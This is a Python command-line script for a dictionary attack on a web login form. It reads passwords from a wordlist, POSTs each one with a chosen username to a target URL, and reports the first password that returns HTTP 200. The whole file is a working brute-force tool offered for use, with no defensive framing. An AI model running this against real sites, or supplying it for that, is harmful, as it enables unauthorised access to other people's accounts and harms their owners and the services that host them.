import requests
import time
import sys

def send_request(url: str, login: str, password: str)->bool:
    try:
        response = requests.post(url, data={
            'username':login,
            'password': password
        })

        return response.status_code == 200

    except:
        return False
    
def send_wordlist(url, login, wordlistpath):
    
    found = True
    cronn = time.time()

    with open(wordlistpath, 'r') as file:
        for password in file:
            if send_request(url, login, password):
                found_login(url, login, password, get_time(cronn))
                found = False
                return
    
    
    not_found_login(wordlistpath)


RED = '\033[91m'
BLUE = '\033[94m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RESET = '\033[0m'

def not_found_login(wordlistpath):
    print(RED + f"Not found login password in wordlist provided {wordlistpath}" + RESET)

def found_login(url, login, password, cronn):
    print(BLUE + "[LOGIN FOUND]" + RESET)
    print(GREEN + f"- login: {login}" + RESET)
    print(GREEN + f"- password: {password}" + RESET)
    print(YELLOW + f"time spent {cronn}s" + RESET)

def get_time(begin)->str:
    end = time.time()
    cronn = end - begin
    return f"{cronn:.2f}"

def main(args: list):

    if args[0] == '-h' or args[0] == '--help':
        print("main.py -u [URL] -l [LOGIN] -p [WORDKLIST]")
        print("URL - url to send request in looping by the wordlist")
        print("Used method http: POST, params: username, password")
        print("LOGIN - the username of login")
        print("WORDKLIST - the wordlist file path used to dictionary attack")
        return

    send_wordlist(args[1], args[3], args[5])

main(sys.argv[1:])